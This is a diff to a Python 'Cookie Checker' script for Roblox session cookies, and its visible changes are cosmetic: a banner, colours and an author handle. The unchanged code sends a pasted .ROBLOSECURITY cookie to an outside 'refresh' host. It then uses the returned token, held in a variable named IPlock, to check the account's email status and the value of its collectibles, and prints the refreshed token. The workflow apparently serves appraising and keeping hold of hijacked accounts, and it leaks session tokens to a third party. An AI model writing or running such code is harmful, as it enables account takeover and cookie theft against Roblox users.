@@ -2,12 +2,19 @@ import requests
 from colorama import Fore, Style, init
 import os
 import time
+def title():
+  print(f"{Style.BRIGHT}{Fore.MAGENTA}|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|")
+  print(f"{Fore.MAGENTA}|   {Style.BRIGHT}{Fore.GREEN}Cookie Checker  {Fore.MAGENTA}|")
+  print(f"{Fore.MAGENTA}|    {Style.BRIGHT}{Fore.BLUE}Made by {Fore.YELLOW}458    {Fore.MAGENTA}|")
+  print(f"{Fore.MAGENTA}|___________________|\n")
+title()
 init(autoreset=True)
 print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Enter '?' for help/info.")
 cookie = input(f"{Style.BRIGHT}{Fore.GREEN}Enter Cookie:{Fore.BLUE}").strip()
 os.system("cls")
+title()
 def help():
-  print("Paste the .ROBLOSECURITY when prompted.\n\nMade by i_458_i, Feel free to DM me for help.\nThis will close in 15 seconds")
+  print("Paste the .ROBLOSECURITY when prompted.\n\nMade by 𝕴458𝕴#2969, Feel free to DM me for help.\nThis will close in 15 seconds")
   time.sleep(15)
   quit()
 if cookie == "?":help()
@@ -15,6 +22,7 @@ print(f"{Style.BRIGHT}{Fore.YELLOW}Refreshing Cookie...")
 IPlock = requests.get(f"https://eggy.cool/refresh/v2.4.php?cookie=" + cookie).text.strip()
 try:
  os.system("cls")
+ title()
  r=requests.get("https://accountsettings.roblox.com/v1/email", cookies={'.ROBLOSECURITY': IPlock}).json() #EMAIL VERIFICATION
  if "verified" in r:
     print(f"{Style.BRIGHT}{Fore.GREEN}Email:{Fore.BLUE} Verified")
@@ -60,11 +68,12 @@ try:
    name = collectible["name"]
    value = collectible["recentAveragePrice"]
    x = "{:,}".format(value)
-   print(f"{Style.BRIGHT}{Fore.GREEN}{name}: {Fore.YELLOW}{x}$")
- print(f"{Style.BRIGHT}{Fore.GREEN}Refreshed Cookie:\n{Fore.BLUE}{IPlock}")
+   print(f"{Style.BRIGHT}{Fore.BLUE}{name}: {Fore.YELLOW}{x}$")
+ print(f"{Style.BRIGHT}{Fore.GREEN}\nRefreshed Cookie:\n{Fore.BLUE}{IPlock}")
  print(Style.BRIGHT+ Fore.LIGHTBLACK_EX + "\nCRTL + CLICK. To follow links.")
  input(Style.BRIGHT+ Fore.RED + "Press enter to exit.")
 except:
   os.system("cls")
+  title()
   print(f"{Style.BRIGHT}{Fore.RED}Invalid Cookie")
   input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Press enter to exit.")
